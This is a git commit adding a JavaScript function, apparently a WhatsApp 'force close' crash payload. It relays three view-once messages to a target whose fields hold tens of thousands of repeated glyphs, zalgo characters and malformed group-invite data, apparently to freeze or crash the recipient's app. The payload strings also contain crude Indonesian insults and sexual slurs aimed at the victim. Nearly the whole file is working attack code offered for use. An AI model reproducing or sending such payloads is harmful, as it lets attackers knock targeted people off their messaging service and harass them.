4bbf60c8b73f719bd58066cb6ab25a63d776d654
zexxo099 <zexxostore85@gmail.com>
2025-10-13 19:04:07 +0700

    [BOT] Upload file: FC nih wok.js

---
+++ gacha_files/FC nih wok.js
@@ -0,0 +1,159 @@
+async function Fcnihbang(Vync, target) {
+  try {
+    let message = {
+  viewOnceMessage: {
+    message: {
+      messageContextInfo: {
+        deviceListMetadata: {},
+        deviceListMetadataVersion: 2,
+        ephemeralSetting: "86400",
+      },
+      listMessage: {
+        title: "z꙰e꙰x꙰x꙰o꙰".repeat(4000),
+        description: ("꧅ zexxo nih bg ꧅".repeat(3000)),
+        footerText: "꧁BAPAK LU GUA HYTAMIN꧂ ".repeat(5000),
+        buttonText: "꧁ꦾKONTOL LU KECIL꧁ꦾ".repeat(6000),
+        listType: 1,
+        sections: [
+          {
+            title: "z꙰e꙰x꙰x꙰o꙰".repeat(5000),
+            rows: [
+              {
+                title: "z꙰e꙰x꙰x꙰o꙰".repeat(1500),
+                description: "z꙰e꙰x꙰x꙰o꙰".repeat(5000),
+                rowId: "z꙰e꙰x꙰x꙰o꙰".repeat(5000),
+              },
+              {
+                title: "𒀱".repeat(1500),
+                description: "꧄꧉꧋꧆ꦿꦸ꧉꧇꧉ꦾꦿ꧋꧉꧆ꦿꦾꦿ꧆ꦿ꧄ꦿꦾ꦳꧅ꦿ꧉ꦿ꧋ꦿ꧉꧇꧉ꦾꦿ꧋꧉꧆ꦿꦾꦿ꧆ꦿ꧄ꦿꦾ".repeat(5000),
+                rowId: "zexxoo".repeat(5000),
+              },
+              {
+                title: "zexxo  ".repeat(1500),
+                description: "꧄꧉꧋꧆ꦿꦸ꧉꧇꧉ꦾꦿ꧋꧉꧆ꦿꦾꦿ꧆ꦿ꧄ꦿꦾ꦳꧅ꦿ꧉ꦿ꧋ꦿ꧉꧇꧉ꦾꦿ꧋꧆ꦿꦾꦿ꧆ꦿ꧄ꦿꦾ꦳ ".repeat(5000),
+                rowId: "꧄꧉꧋꧆ꦿꦸ꧉꧇꧉ꦾꦿ꧋꧉꧆ꦿꦾꦿ꧆ꦿ꧄ꦿꦾ꦳꧅ꦿ꧉ꦿ꧋ꦿ꧉꧇꧉ꦾꦿ꧋꧉꧆ꦿꦾꦿ꧆ꦿ꧄ꦿꦾ꦳".repeat(5000),
+              },
+              {
+                title: "꧄꧉꧋꧆ꦿꦸ꧉꧇꧉ꦾꦿ꧋꧉꧆ꦿꦾꦿ꧆ꦿ꧄ꦿꦾ꦳꧅ꦿ꧉ꦿ꧋ꦿ꧉꧇꧉ꦾꦿ꧋꧉꧆ꦿꦾꦿ꧆ꦿ꧄ꦿꦾ꦳".repeat(1500),
+                description: "꧄꧉꧋꧆ꦿꦸ꧉꧇꧉ꦾꦿ꧋꧉͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͜͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞͞꧆ꦿꦾꦿ꧆ꦿ꧄ꦿꦾ꦳ ".repeat(5000),
+                rowId: "͜".repeat(5000),
+              },
+            ],
+          },
+        ],
+      },
+    },
+  },
+};
+    await Vync.relayMessage(target, message, { participant: { jid: target } });
+    console.log("Sending message:", JSON.stringify(message, null, 2));
+
+    let Zexmessage = {
+  viewOnceMessage: {
+    message: {
+      messageContextInfo: {
+        deviceListMetadata: {},
+        deviceListMetadataVersion: 2,
+        ephemeralSetting: "86400",
+      },
+      callMessage: { 
+        offerMessage: {
+          video: false
+        }
+      },
+      documentMessage: {
+        url: "https://zexhamanjir.vercel.app/document.pdf",
+        fileName: "MAU KONTOL?.pdf",
+        mimetype: "application/pdf",
+        title: "".concat("kontoll").repeat(6000),
+        fileLength: "9999999",
+        pageCount: 999999,
+        mediaKey: "mediaKeyString",
+        fileSha256: "fileSha256String",
+        fileEncSha256: "fileEncSha256String",
+        directPath: "directPathString",
+        mediaKeyTimestamp: "1678999999",
+      },
+      contactMessage: { 
+        displayName: "".concat("zexxhamaa").repeat(400), 
+        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${"".concat("bawokkkk ").repeat(888)};;;;\nFN:${"".concat("bokepppp").repeat(888)}\nTEL;type=CELL;waid=9999999999:+9999999999\nEND:VCARD`,
+        contextInfo: {
+          mentionedJid: [target],
+        }
+      },
+      extendedTextMessage: {
+        text: "".concat("kontoll").repeat(9000),
+        contextInfo: {
+          mentionedJid: [target],
+          forwardingScore: 99999999,
+          isForwarded: true,
+          externalAdReply: {
+            title: "".concat("mikir kids").repeat(80),
+            body: "".concat("mikir kids ").repeat(80),
+            mediaType: 1,
+            thumbnailUrl: "https://files.catbox.moe/bbwdlx.png",
+            sourceUrl: "https://google.com",
+            mediaUrl: "https://files.catbox.moe/bbwdlx.png"
+          }
+        }
+      },
+      interactiveMessage: {
+        contextInfo: {
+          mentionedJid: [target],
+          isForwarded: false,
+          forwardingScore: 0,
+          locationMessage: {
+            degreesLatitude: "".concat("-7.95317").repeat(6000),
+            degreesLongitude: "".concat("112.62801").repeat(6000),
+          },
+        },
+        body: {
+          text: "".concat("lagi ngapain bang?").repeat(1) + "".concat("\u2000").repeat(9999),
+        },
+        nativeFlowMessage: {
+          messageParamsJson: '[]',
+          buttons: [
+            {
+              buttonId: "".concat("btn_extra_1").repeat(10),
+              displayText: "".concat("bokep").repeat(400),
+            },
+            {
+              buttonId: "".concat("btn_extra_2").repeat(10),
+              displayText: "".concat("bokep").repeat(400),
+            },
+          ],
+        },
+      },
+    },
+  },
+};
+    await Vync.relayMessage(target, Zexmessage, { participant: { jid: target } });
+    console.log("Sending Zexmessage:", JSON.stringify(Zexmessage, null, 2));
+
+    let inviteGroupMessage = {
+  viewOnceMessage: {
+    message: {
+      messageContextInfo: {
+        deviceListMetadata: {},
+        deviceListMetadataVersion: 2,
+        ephemeralSetting: "86400",
+      },
+      groupInviteMessage: {
+        groupJid: ("120363178783594253@g.us" + "ꦾ".repeat(9000)),
+        inviteCode: ("abc123xyz456" + "ꦾ".repeat(9000)),
+        inviteExpiration: ("99999" + "ꦾ".repeat(9000)),
+        groupName: ("͂̓̉̏̆͗̾̋ͯ̌ͤͧ̀̌͊ͫ̃͑̋̇ͯ̿ͨͧ̅ͭͥ̾͆ͫ͋̆̍҈̨̀͢͢҉̴̡͟͢͝҉̶̵̶̴̧̕͠҈̶̸̀҈҉̴̶̶̡̡̧̨̛̀͟͢͜͢͞͠͞͞҉̕̕͏̴̸̳̭̙̳̯̪̳͇͇̭͓͖̳̮̗͇̬͙̩͓̗͈͖̰̜̦̥̥̭̪̩̙̘̞͎̳̻̝̹̼̮̣̻̜͕͉̱͖͕̩̻̤̺͙̼̱̰̥̃ͭ̏̽ͣ̇̓͗ͧ̅ͨ͂̉ͥ̋͒̈́ͣ̽͑͒ͥͨ̒͑̿̍̓ͦ̉ͤ͂ͬ͗̎̾̎ͯͧ͆̎̒͂͛̾ͬ́̋ͩͯ͢͟͝҈̸̵̶̴̢̡̨̧͜͟͢͞͏̨̧̀͢͢͏̶̶̡͢͢͡͡͏҉͢͠҉̶̨̢̀͠҈̴̴̷̡̡͘͢͟͏̨̠̫̖̝̣̖̰̘̙̻͚͈̘̺̙̘͕̜̳̻͚̠̙̬̫̝̯̞̖͚͓̙̹͚͕̟͙̻͞ͅu0332̵̡͈̭͍͕͖̻͎̺̹̥̖̈̒͑̐̎ͧͣͪ̆̌̇̓̔̊̄̓̄̇̅͌̇͗̎̈͑̌ͣ͌͒͗̈́̀ͩ̃ͭ̀̃ͥ̀̓̽̉̋̄ͦ͂̿̈́̚̚͘͘͟͡͡҉̷̸̷̨̡̢́̀́̀͘̕͢͟͢͡͝͡͞͡͡͏̴̧͢͞҉̨͢͢͞҈̸͢҈̸̡̟̯́͢͜͝͞u0332̷̴̷̢͇̮̮̣̩͕̜̬͇͉̪͙͎̬̘̯̫̤̗͕̭̞͈̱̖̼̞̮̱̱̭̯̙̺͓̝͕̼̳͍̥̬̞̬̰̐̋ͨ͒ͧͫͥͨ̽ͮ̓͌̉̈́̄͋̋ͧ́̆ͪͣ͂̅͗̆ͫ͂̈͆̾̐ͯͬ̂̎͆́̂̀̋ͧ̐ͬ̅̇̅ͭ̅̚̕͠͠ͅͅͅ͏͏̶̧̀͘͢͢͡͏҈̶̸́͢͢͏̶̴̨̡́͘̕͢͜͢͏̡̢̢̀͘͜͢͢͢͝͝͞҈̶̳̣̥͉̟̥̫̬͔͔̰̼̞͎͎͔̹̭͖͉̮͔̝̝͍̣̮͖͈͕̰̟̫̪̺̠̹̱͉̖̝͈͔̦̼͕͍͙̗͡ͅ" + "ꦾ".repeat(9000)),
+        caption: ("nocuree" + "ꦾ".repeat(9000)),
+      },
+    },
+  },
+};
+    await Vync.relayMessage(target, inviteGroupMessage, { participant: { jid: target } });
+    console.log(
+      "Sending inviteGroupMessage:",
+      JSON.stringify(inviteGroupMessage, null, 2)
+    );
+  } catch (err) {
+    console.log(err);
+  }
+}
